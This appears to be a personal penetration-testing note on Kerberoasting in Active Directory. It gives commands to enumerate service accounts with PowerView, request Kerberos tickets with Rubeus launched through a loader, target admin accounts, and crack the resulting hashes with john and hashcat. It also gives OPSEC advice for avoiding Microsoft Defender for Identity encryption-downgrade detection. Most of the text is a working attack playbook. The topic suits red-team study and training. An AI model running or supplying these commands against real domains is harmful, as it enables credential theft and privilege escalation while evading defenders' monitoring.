Kerberoasting flys under the radar due to the actions being completely legitimate, we just keep the ticket for the password hash and bruteforce it offline.


Discover kerberoastable users (PowerView & AD Module)
```powershell
Get-DomainUser -SPN

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Check with Rubeus
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /stats
```

> [!NOTE] Nore
>  If we see any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password 
### OPSEC Kerberoast
To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC

**DO ONE ACCOUNT AT A TIME TO HAVE THE TICKET REQUESTS LOOK LEGITIMATE**
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /stats /rc4opsec
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:svcadmin.hash

C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txt
```

### Standard Kerberoast
Target a single user - **Adding `/tgtdeleg` will give us a RC4 ticket increasing cracking speeds (Doesn't work on Windows server 2019 and up)** 
```powershell
C:\Users\Public\Loader.exe -path  C:\Users\Public\Rubeus.exe -args kerberoast /tgtdeleg /user:sapservice /nowrap
```

Target admin accounts
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
```

--- 

Check encryption type (`0`= `RC4` | `24`= `AES 128/256`) - **PowerView**
```powershell
Get-DomainUser sapservice -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

---
Crack
```bash
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250513191525.png]]